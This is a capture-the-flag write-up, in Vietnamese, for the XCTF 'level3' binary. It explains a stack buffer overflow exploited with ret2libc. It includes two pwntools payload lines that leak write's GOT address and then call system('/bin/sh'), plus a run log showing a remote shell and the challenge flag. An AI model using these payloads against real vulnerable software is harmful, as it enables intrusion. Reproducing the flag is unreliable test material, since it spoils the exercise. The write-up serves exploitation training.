# XCTF - PWN Exercise - level3

```c
#include<stdio.h>

ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/5_level3 λ checksec level3   
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/5_level3/level3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Chương trình rất đơn giản, biến `buf` có 136 kí tự nhưng hàm `read` cho phép đọc 256 kí tự input và chương trình cũng không có flag secure `Canary` => có thể stack buffer overflow để lấy shell tương tác trên server. Chúng ta sẽ dùng phương pháp `ret2libc` vì không có functions nào của chương trình cho phép có shell hay là đọc flag trên server.

Những bài sử dụng kỹ thuật `ret2libc` thường sẽ leak địa chỉ của libc bằng hàm `write` hoặc hàm `puts` rồi sau đó tính toán `offset` và địa chỉ của các hàm liên quan đến lấy shell tương tác như: `địa chỉ cơ sở của libc`, `system`, chuỗi `"/bin/sh"`,... do địa chỉ tương đối giữa các hàm trong libc là cố định (khoảng cách giữa các hàm).

Để lấy địa chỉ của hàm `system` của bài này, ta có thể sử dụng hàm `write()` để thực hiện tính toán offset. 

   1. Đầu tiên sử dụng hàm write() để tính địa chỉ thực của hàm `write()` được chương trình lưu trong `GOT` (kiến thức liên quan đến liên kết động thư viện libc của file ELF). 
   
   2. Sử dụng khoảng cách tương đối giữa các hàm để tính địa chỉ thực của `system` và `"/bin/sh"`.

=> Đối với cuộc tấn công đầu tiên, chúng ta sử dụng tràn ngăn xếp để làm rò rỉ địa chỉ thực của hàm write() trong bảng GOT, sau đó trừ đi phần bù trong libc để lấy địa chỉ cơ sở của libc. 

```
payload1 = 'A' * 0x88 + p32 (0xdeadbeef) + p32 (write_plt) + p32 (main_addr) + p32 (1) + p32 (write_got) + p32 (0xdeadbeef)
```

=> Cuộc tấn công thứ hai sẽ quay lại functions `main`, vượt qua tràn ngăn xếp một lần nữa và sử dụng chức năng `system` tính toán được để `get shell` :p.

```
payload2 = 'A' * 0x88 + p32 (0xdeadbeef) + p32 (sys_addr) + p32 (0xdeadbeef) + p32 (bin_sh_addr)
```

Việc tính toán một số địa chỉ liên quan qua địa chỉ của hàm `write` leak được. Địa chỉ được tính như sau:

|   Địa chỉ các hàm   |          Tính toán                                                     |
|   :-------------:   | :--------------------------------------------------------------------: |
|      libc_addr      | (địa chỉ write lưu tại GOT của write) - (offset của write so với libc) |
|     system_addr     | libc_addr + (offset của system so với libc)                            |
|     bin_sh_addr     | libc_addr + (offset của chuỗi "/bin/sh" so với libc)                   |



Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/5_level3 λ python2 exploit.py
[+] Opening connection to 111.200.241.244 on port 51341: Done
('Write_got address is', '0xf76e13c0')
('libc address is', '0xf760d000')
('system address is', '0xf7647940')
('/bin/sh address is', '0xf776602b')
[*] Switching to interactive mode
Input:
$ ls
bin
dev
flag
level3
lib
lib32
lib64
$ cat flag
cyberpeace{30760e28dd5d22b93e22a2d89a7113b9}
$  
```
